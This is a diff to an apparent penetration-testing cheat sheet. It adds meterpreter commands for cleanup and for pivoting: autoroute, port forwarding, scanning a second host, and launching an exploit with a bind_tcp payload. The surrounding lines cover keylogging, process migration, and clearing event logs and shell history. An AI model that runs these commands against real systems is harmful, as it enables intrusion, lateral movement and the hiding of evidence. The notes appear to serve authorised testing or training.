@@ -30,6 +30,11 @@ meterpreter > keyscan_stop
 meterpreter > migrate -N winlogon.exe
 ```
 
+## Cleanup Resource Scripts
+```
+meterpreter > resource <path_to_cleanup_rc_file>
+```
+
 ## Clear Linux History
 ```
 cat /dev/null > ~/.bash_history
@@ -40,6 +45,34 @@ history -c
 ```
 meterpreter > clearev
 ```
+
+## Pivoting
+```
+meterpreter > ipconfig
+meterpreter > arp
+```
+```
+meterpreter > run autoroute -s <subnet_in_cidr>
+meterpreter > run autoroute -p
+```
+```
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <ip2>
+```
+```
+meterpreter > portfwd add -l <local_port_on_kali> -p <remote_port_on_ip2> -r <ip2>
+meterpreter > portfwd list
+```
+```
+netstat -an | grep LISTEN
+nmap -Pn -sV -p<local_port> localhost
+```
+```
+use <exploit_module>
+set RHOSTS <ip2>
+set payload windows/meterpreter/bind_tcp
+```
+- `LPORT` will be opened on `<ip2>`.
 
 ## Working Directories
 - Windows: `C:\Temp`
